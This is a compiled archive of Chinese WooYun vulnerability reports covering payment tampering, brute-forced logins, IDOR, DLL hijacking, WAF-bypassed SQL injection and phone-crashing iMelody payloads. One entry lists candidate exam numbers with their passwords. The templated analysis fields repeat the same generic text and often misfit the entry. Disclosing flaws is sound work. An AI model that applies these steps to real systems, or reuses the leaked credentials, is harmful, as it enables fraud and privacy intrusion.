**POC**: 测试了下 修改邮费那可以进行-负值拿出 拿出微软大牛写的神器然后 成功提交  生成了订单付款试试？然后      不搞了  只是友情检测下！请速度修护吧  可不能让非法分子有机可乘！ 想想 假如一个人  开在申请开个网店   然后就可以一直刷钱   提款 神马最后望乌云能够给个邀请码  能够更好的交流 与学习     为打造一个宁静安全的网络，出自己一份微薄之力  并祝愿wooyun越来越好

**绕过**: 直接利用

**修复**: 加个签名验证  或者神马的   方法很多
---

---
### [wooyun-2014-078718] 某IDC存在支付漏洞可随意刷余额（任意充值）
**厂商**: XX科技 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某idc存在漏洞可随意刷余额，可批量刷。。首先去注册一个账号，然后在购买数据库点击审查元素修改为负值，ok，他给你送钱来了。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的~
---

---
### [wooyun-2015-0157729] 百洋集团OA系统设计逻辑缺陷内部信息泄露
**厂商**: 百洋集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百洋医药集团有限公司是专注于健康产业投资的企业集团，主要投资健康品牌、企业股权及健康产业相关物业，目前集团下设百洋医药，百洋投资和百洋地产三大业务板块。百洋医药作为专业的健康品牌运营商，在全国各地设有10个分公司、50余个办事处，专业营销人员1000余人，与全国9000家大中型医院750家各级药品批发公司，170,000多家药店建立起了广泛的业务联系。百洋医药已连续打造出多个年销售过亿元人民币的知名药品品牌，并已经成为国内外多个药品品牌的中国大陆总代理，同时拥有符合专业电商及新版GSP标准的现代医药物流配送平台。漏洞地址：https://example.com/[已脱敏] 123456邮箱：当前在线：论坛：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2015-0150288] 某省气象局邮件系统设计逻辑缺陷获取敏感信息
**厂商**: 某省信息安全测评中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/抓取post信息使用常见人名，密码123456，可成功跑出登陆成功用户注册过某省科技业务管理阳光政务平台，平台可通过邮件找回密码登陆，测试没有重置密码

**POC**: http://**.**.**.**/抓取post信息使用常见人名，密码123456，可成功跑出登陆成功用户注册过某省科技业务管理阳光政务平台，平台可通过邮件找回密码登陆，测试没有重置密码

**绕过**: 直接利用

**修复**: 验证、次数限制、强口令
---

---
### [wooyun-2014-075121] 华夏人寿网上客户服务平台验证码绕过（可爆破）
**厂商**: 华夏人寿 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过测试发现，前端虽然有验证码，但是每次提交后不会刷新，可以暴力破解为了说明问题，小跑一下，出来两账号 admin8和test12 ,密码是123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 要像乌云一样认真对待验证码。
---

---
### [wooyun-2012-07017] 秒必得充值漏洞
**厂商**: 武汉华诚在线科技有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册用户在充值秒币时，通过修改链接地址数值，可以达到充值金额数值的修改。

**POC**: 1.注册-登陆-充值随便选择一个，点击“确认购买”2.3.https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你懂的。。。
---

---
### [wooyun-2013-039002] 安全狗新版本提权防护的一个小缺陷
**厂商**: 安全狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 小缺陷 可以通过权限提升工具执行net1 user 更改 管理员密码直接登陆以前版本拦截更改密码最新版本不知道怎么回事没拦截

**POC**: 利用网上已公开的一大堆exp 提升权限至system直接执行net1 user administrator yourpassword顺利登陆 无需添加帐号 以前版本安全狗拦截 最新版不拦截

**绕过**: 直接利用

**修复**: 求把上次欠我的rank还给我 上次你理解错误只给了5rank
---

---
### [wooyun-2013-042036] 某社交平台某站VIP购买可任意修改价格(有支付证明)
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刚才提交没有现实最后结果,从新提交一下把.ApplyMoney=720&IsAgree=1&button=+%E7%AB%8B%E5%8D%B3%E6%94%AF%E4%BB%98+修改ApplyMoney的值.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 公告上面显示开通成功,但是功能还没有具体应该是管理员审核问题把,但是忽悠还是能搞定的把.
---

---
### [wooyun-2015-0111976] 婚礼纪逻辑缺陷可盗用别人账号发帖
**厂商**: hunliji.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、看到了排行榜第一的妹纸，先搞到id2、关注抓包就搞到了啊：user_id=7389003、果断发帖修改id4、哈哈哈5、测试地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: = =权限
---

---
### [wooyun-2014-052313] cbox央视影音播放器dll劫持
**厂商**: 中国网络电视台 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: cbox央视影音播放器在启动的时候会加载不存在的d3dx9_30.dll, 攻击者可以通过伪造某视频文件或者办公文件放在远程服务器上，诱使用户点击观看，并同时在程序安装目录释放这样不存在的经伪造的恶意dll，或直接在本地cbox播放器安装目录下放置经过伪造的恶意dll，即可在程序启动时执行任意代码。

**POC**: 测试代码如下：BOOL APIENTRY DllMain( HMODULEhModule,DWORD  ul_reason_for_call,LPVOID lpReserved){switch (ul_reason_for_call){case DLL_PROCESS_ATTACH:MessageBox(NULL, "dllhijacked!", "by jun",0);break;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;}return TRUE;}测试结果

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08470] Android手机系统锁屏功能信息泄露风险
**厂商**: google/android | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我用的是三星i9220 android系统是2.3.5这个信息泄漏的前提条件是手机开放了屏幕解锁设置功能，且绑定了google帐户或者设置密码保护问题。一般默认情况下手机锁屏后需要输入解锁密码或者图案才能进入手机下面是我的手机锁屏画面默认状态下手机解锁图案下方只有一个拨打“紧急号码”功能假设我们不知道这部手机的解锁方式，随意输入5次错误的解锁图案这时候锁屏图案下放出现了一个“忘记样式？”的按钮正常情况下是需要我们输入之前绑定的google帐号密码就可以设置新的解锁密码不过现在可以长按输入筐会出现一个功能选项，比如“粘贴”和“剪贴板”我们直接选择剪贴板现在既可看到手机用户之前所有的剪贴记录，如短信或者其他敏感信息之类。其他android版本的手机你们可以自己试试。

**POC**: 我们直接选择剪贴板现在既可看到手机用户之前所有的剪贴记录，如短信或者其他敏感信息之类。其他android版本的手机你们可以自己试试。

**绕过**: 直接利用

**修复**: 取消锁屏后输入框的选项吧
---

---
### [wooyun-2015-0105895] 360免费WiFiapp Android客户端绕过免费上网
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 《360免费WiFi》app Android客户端可以免费使用移动联通电信的公共wifi，虽然有使用时间限制，但是只要成功登录上CMCC，chinanet，chinaunicom等公共wifi，通过结束后台进程就可以绕过某安全厂商的时长检测免费上网。

**POC**: 登录《360免费WiFi》app Android客户端查询360免费wifi的剩余时长连接CMCC-WEB公共wifi回到桌面结束app进程随便上个网页，发现还是可以访问的现在就可以随便上网了等几个小时候断开wifi，连接数据流量进app查时长对比各个图左上角的时间就可以发现了这是可以绕过360检测剩余时长的

**绕过**: 过滤绕过

**修复**: 你们比我更专业，→_→免费送时长不？
---

---
### [wooyun-2015-0133903] 万象网管设计缺陷实现无限时上网
**厂商**: 万象网管 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我是在14：16分用3块钱开的机子，2元/小时，已经16：32了，也就是我已经用1个小时30分钟的钱上了2个多小时的网，而且只要我不关机我可以连续一天玩。具体方法：1.找到进程中的clsmn，开始检测2.找到线程 iocp.dll（4个），选择全部挂起3.等4个iocp.dll线程都变成红色，恭喜你，可以了！！！小视频：https://example.com/[已脱敏]

**POC**: 我是在14：16分用3块钱开的机子，2元/小时，已经16：32了，也就是我已经用1个小时30分钟的钱上了2个多小时的网，而且只要我不关机我可以连续一天玩。到了16：48，我的上级时长还是0小时37分钟。

**绕过**: 直接利用

**修复**: 等待成都吉胜科技有限责任公司里的大牛修复
---

---
### [wooyun-2015-0152156] 某通用特种设备管理平台设计缺陷影响全国绝大省份地区
**厂商**: 上海君睿信息技术有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：上海君睿信息技术有限公司系统名称：特种设备作业人员管理平台漏洞问题：设计缺陷导致的遍历关键字：特种设备作业人员考核管理平台缺陷页面：dwbm_bminfoshow.do?bmid=根据搜索引擎，列举部分不完全案例如下：湖北省特检院特种设备作业人员考核管理平台http://**.**.**.**/dwbm_bminfoshow.do?bmid=1http://**.**.**.**/dwbm_bminfoshow.do?bmid=900河北特种设备作业人员考核管理平台http://**.**.**.**/dwbm_bminfoshow.do?bmid=400http://**.**.**.**/dwbm_bminfoshow.do?bmid=9854【9000多个人员】贵州省特种设备作业人员考核管理平台大约是用3500开始http://**.**.**.**/dwbm_bminfosh

**POC**: 江苏省特种设备管理平台：http://**.**.**.**/index.shtml湖南省特种设备管理平台：http://**.**.**.**/index.shtml安徽省特种设备管理平台：http://**.**.**.**/index.shtml四川省特种设备管理平台：http://**.**.**.**/default.shtml海南省特种设备管理平台：http://**.**.**.**/index.shtml贵州省特种设备管理平台：http://**.**.**.**/index.shtml吉林省特种设备管理平台：http://**.**.**.**/index.shtml广西省特

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143825] 全国计算机应用能力考试自贡考区成绩查询系统匹配逻辑缺陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/cx/index.htm 这是成绩查询接口在该图片中，出了第一个超链接是跳转到四川人事考试网成绩查询界面之外，剩下的4个查询接口，都是在**.**.**.**这个域名中的。现在，我们点开第2个链接，跳转到了http://**.**.**.**/cx/jsj00.html那我们点开最近的2015年的，然后经过点点点，我们最终来到了这里http://**.**.**.**/cx/qgjsj70/index.htm然后在输入框中随意输入，任何数字，系统便会匹配出一则数据，也就是考生的信息。嗯，就是酱紫

**POC**: 综上所述，我们首先输入1，得到结果然后我们再输入123，得到结果最后试一试321，得到结果

**绕过**: 直接利用

**修复**: 可以为用户设置账号，这样的数据泄露在.gov网站我觉得还是不该有
---

---
### [wooyun-2015-0155578] 美丽约App/认证绕过/敏感信息泄漏
**厂商**: miliyo.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美丽约手机Android APP decviceID 认证缺陷，可以伪造deviceID，再通过逆向APP算出数据包的校验算法，进而可以绕过认证，获取到所有用户隐私信息。

**POC**: 伪造数据包：贴出部分：通过绕过后台的deviceID的限制次数，可以完美获取到所有用户的隐私信息。这还危害不大。。。那别人也能开这个网站了。。。。。

**绕过**: 过滤绕过

**修复**: 这还提交不过。。就不用修复了。。。=T T
---

---
### [wooyun-2015-0111617] 拉勾网百万简历泄漏风险(包括手机、邮件、应聘职位等信息、还可冒充企业身份筛选简历、发面试通知等)
**厂商**: lagou.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册一个企业账户，发布一个职位，然后看到有２个人投了简历：打开简历，点转发：抓包：改简历id，话说这是get：去邮箱看到有２封邮件：第一封是我发布职位里的没错：第二封跪了：看看能打开吗：换个人：查看联系方式：手机，邮箱出来了：进一步操作，可以看到应聘职位：经过自己的账号测试，简历操作都会真实改动。随机抽查：使用pydbg这种工具可瞬间建立离线简历库，还好我是良民- -，有没有信息贩子路过你们好好查查吧。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-022785] 三福百货存在支付漏洞
**厂商**: 三福百货 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前两天在三福买衣服送了张会员卡说能打折。登陆上去看下发现存在支付漏洞主站：https://example.com/[已脱敏] 修改购买数量为-1 然后再买一件裤子 进行结算的时候提示购物车没商品  于是再买了见背心  呵呵 订单提交成功。加上邮费一共39  你们感觉贵么？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146439] 某市民政邮箱系统设计逻辑缺陷（信息泄露）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/coremail/index.jsp?cus=1密码：123456，top500姓名爆破lixiulan 123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码，个人信息泄露
---

---
### [wooyun-2014-054683] 熊猫翻滚逻辑漏洞导致可任意使用代理
**厂商**: pandafan.org | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该网站提供了用于手机的代理服务。但使用该服务时要求用户保密未其分配的端口号，实际上端口号可以快速的被扫描出来。

**POC**: nmap扫描出了其他人的端口。

**绕过**: 直接利用

**修复**: 好像没什么办法修复……
---

---
### [wooyun-2014-083457] php设计缺陷导致绕过open_basedir列举目录#2
**厂商**: PHP | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: @/fd的代码里对于列目录有两个方法，一是利用DirectoryIterator类，二是利用realpath函数。前者很好用，我就不多说了。单说下后者，realpath函数在处理已存在的文件（目录）与不存在的文件（目录）时情况不同，如果文件已存在则会抛出错误:open_basedir restriction in effect. File(xxxxx) is not within the allowed path(s)，如果文件不存在则会返回false。所以我们可以通过捕捉错误handle，来判断某文件是否存在。我的第二个方法也类似。php中有个bindtextdomain函数，看看文档：为一个domain设置一个path，这个path就是一个文件名。这个函数，在$directory存在的时候返回$directory，不存在则返回false。测试代码：<?phpprintf('<b>ope

**POC**: 很不幸的是，这个函数似乎不支持windows，我在win下测试报错Call to undefined function bindtextdomain()……，而linux下似乎没有<>等好用的通配符？所以只能暴力枚举了。暴力枚举方法见@/fd的代码：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 只要在open_basedir外，不管文件是否存在，都应该抛出相同错误。
---

---
### [wooyun-2014-070001] 慧琳主机系统API漏洞可导致明文密码脱库
**厂商**: WinIIS.com | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WinIIS是现在国内市场占有率最高的主机系统（没有之一），这个影响有点大哦~去年年底数万域名被恶意泛解析，基本都是因为WinIIS的漏洞，而且是明文密码被拖库导致的。用WinIIS的小伙伴们也不用担心，只要不随便给别人开放API接口就行了。存在漏洞的地址：/API/RegAPI.asp

**POC**: 利用代码：慧琳域名，主机密码都是明文的，乌云的小伙伴们又可以快乐的爆库了

**绕过**: 直接利用

**修复**: 慧琳懂的
---

---
### [wooyun-2015-0110689] 芒果TV视频播放器DLL劫持漏洞
**厂商**: hunantv.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 芒果TV视频播放器最新版版本：[IP已脱敏]  官方下载安装版本mangguoTV_V4.2.0.111_setup.1426835792.exe ，不存在的DLL：QMediaInfo.dll    evr.dll（这些文件没有随芒果TV播放器一起安装），导致恶意攻击者可以伪造DLL文件用于劫持目录：F:\HunanTV\

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2016-0157268] APP巡诊系列之：大白APP某功能设计逻辑缺陷
**厂商**: 杭州晓宇科技有限公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 拉钩地址：https://example.com/[已脱敏]

**POC**: 1，任意用户注册【验证码明文返回】2，注册成功3，同理重置任意用户密码时短信验证码也是明文返回的

**绕过**: 直接利用

**修复**: 不要为难程序员。他们也不容易。
---

---
### [wooyun-2015-0141298] 工业大学某处逻辑漏洞致权限获取
**厂商**: 合肥工业大学 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT

**POC**: URL:https://example.com/[已脱敏] 然后抓包将useid换成管理员的admin提示修改成功之后找到后台 利用刚修改的密码 登录后台登录成功，修改允许上传的文件格式

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-063822] 360/加速乐/某搜索引擎云加速/安全宝等所有waf产品某些条件下绕过
**厂商**: 360/加速乐/某搜索引擎云加速/安全宝 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试了下市面上 360/加速乐/某搜索引擎云加速/安全宝这四个waf产品  在某种条件下均可以绕过 顺利注射出数据库信息。首先我自己搭建了环境 mssql+asp构造了一个 数字型的报错注入点。http://[IP已脱敏] 可以根据内置变量爆出很多想要的信息。另外 如果能猜到字段名还可以这样。爆出了用户名与密码。在测试 做了 360网站卫士/加速乐/某搜索引擎云加速/安全宝 保护的网站之后对这种情况的注射都 束手无策，全部都放行。这里仅用一例 说明下面是加速乐保护的https://example.com/[已脱敏]

**POC**: 同上

**绕过**: 过滤绕过

**修复**: 你们看着办
---

---
### [wooyun-2014-061383] 某通信厂商某移动代理产品有一通用数据库账号
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞已经存在多年，近日在做其他测试时，又重新测试了一下该漏洞，发现在互联网上仍有一些服务器存在该漏洞，希望能引起厂家的重视。

**POC**: 漏洞证明：权限证明：数据库中的部分表信息：

**绕过**: 直接利用

**修复**: 不要内置数据库用户和密码
---

---
### [wooyun-2015-0144218] 360奇酷手机存在应用锁绕过
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看视频

**POC**: 绕过的开始绕过某社交平台绕过短信和通讯录绕过相册播放密码03sec

**绕过**: 直接利用

**修复**: 哦对了，顺便问下，为什么这个手机搜索不到5G的wifi信号？
---

---
### [wooyun-2013-023192] 银泰网支付漏洞，全场商品一分钱啦，一分钱啦~~
**厂商**: 银泰网 | **年份**: 2013 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次的某社交平台某社交平台gsid漏洞至今仍未修复，还有很多用户不乏加V号均泄露gsid，对此很是不爽...转入今天的正题，银泰网联合某股份制银行搞了次一分钱送活动，先吊胃口，详情如下：挑个东东先下单...https://example.com/[已脱敏] know点付款的瞬间，本想截一下包改订单，但是还有更大的收获...尼玛，这不科学...果断改掉，成功不知道付款后会咋样，不过不敢付款，怕请喝茶...别说临时工干的就行了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 某银行c2的支付网关貌似支持post from加sign吧再说了，没必要用get啊...
---

---
### [wooyun-2013-020692] 高德软件短信轰炸
**厂商**: 高德软件 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册时，手机好没有进行验证，可以填写任意手机号，在找回密码是，可以轰炸自己注册时用的手机号码进行短信轰炸，没有间隔时间限制，短信接收次数限制！可以无限提交

**POC**: 注册时，手机好没有进行验证，可以填写任意手机号，在找回密码是，可以轰炸自己注册时用的手机号码进行短信轰炸，没有间隔时间限制，短信接收次数限制！可以无限提交

**绕过**: 直接利用

**修复**: 注册时加强手机验证，找回密码时，限制短息间隔时间和接收次数！
---

---
### [wooyun-2013-034978] 多个客户端应用dll劫持漏洞（Skype，某视频网站，某社交平台，快车，奇艺，某搜索引擎音乐，Cbox）
**厂商**: 多个应用厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经过第三方软件测试发现SHPlayer.exe运行时会加载一个不存在的DLL文件ieframe.dll 。只要自己写一个ieframe.dll与SHPlayer.exe放在同一目录，这样就可以在运行SHPlayer.exe的时候会同时加载ieframe.dll，这个ieframe.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行SHPlayer.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）当时劫持时使用的DLL下载地址：密码58n6https://example.com/[已脱敏] 2013.8.22影响最新版本Version: [IP已脱敏] 其它版本没作测试。   avrt.dll某视频网站PC客户端 2013.8.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！！！
---

---
### [wooyun-2015-0154210] 国家邮政局某系统存在设计逻辑缺陷用户信息泄露
**厂商**: 国家邮政局 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、国家邮政局申诉系统由于网站设计缺陷，无验证码和错误登录次数限制，可撞库登录https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 加入登录验证码和登录错误次数限制PS:能不能把我的快递还给我！！！！！！！！！！！
---

---
### [wooyun-2012-06502] MTK手机短信漏洞大曝光0day
**厂商**: 联发科技股份有限公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个漏洞的精髓就是imy文件。据了解，imy文件是索爱最早支持的一种代码形式的单音节铃声，可以用代码调用手机的解码芯片发出一些声音甚至一些核心指令。所以代码里面如果是诸如黑屏、响铃等类似的命令，发送给对方后，一旦打开也就触发了这些命令，当然会造成相应的结果。目前看来，只要有人能够懂得这些代码的编写语言，发送格式化储存卡一类的短信应该是没有问题的。我手里就有一个格式化命令的imy文件，由于担心给他人造成不良后果，一直没有实验。在我的实验过程中，我发现并非所有屏幕有灰色功能键的手机都能中招，也许这些手机使用的不是MTK方案吧。我推测，既然imy并非MTK手机专有格式，那么理论上所有支持imy铃声的手机都会中招。至于预防，我想这是很难的，毕竟只要触发就会中招，也许只能是看到类似的短信立即关闭，不继续翻阅从而避免激活imy文件代码，可能会有一些帮助。当然，这只是相对的，如果对方发送的短信是先插入的

**POC**: 1.黑屏###########################BEGIN:IMELODYBEAT:1200MELODY:(ledoffbackoffvibeoffr5ledoffbackoffvibeoffr5@600)END:IMELODY###########################2.猛震###########################BEGIN:IMELODYVERSION:1.2FORMAT:CLASS1.0BEAT:100MELODY:(ledoffledonbackoffbackonvibeon@300)END:IMELODY####################

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0162860] 天津自考网某功能设计逻辑缺陷可造成考生信息泄露
**厂商**: 天津自考网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.找到学员准考号：朝升培训：朝升培训网站是天津市高等教育自学考试委员会办公室（简称“天津市自考办”）指定的唯一网络助学平台。网址：http://**.**.**.**/asp/xinsheng/xyxsheng.asp2.进入天津市高等教育自学考试考生服务系统，网址：**.**.**.**/bk3/sys_sy.aspx3.点击忘记密码进入，输入准考号，看到提示问题（如：111111），密码基本也是111111

**POC**: 通过此方法破解的几组密码，请测试：准考证号         密码80215101043	11111180214100882	11111110215100854	00000020211200976	66666610214201263	12312330215101516	00000080213400279	11111120215100154	000000100215100720	11111180215101037	11111130215100393	000000100215100789	11111180215101154	111111

**绕过**: 直接利用

**修复**: 1.通知所有学员更改密码；2.重新设计找回密码流程，建议改用手机验证码的方式；3.朝升培训考生留言板中考生栏隐藏准考号中间字段或显示昵称。
---

---
### [wooyun-2016-0168173] 中核二三集团OA系统设计逻辑缺陷（内部信息泄露）
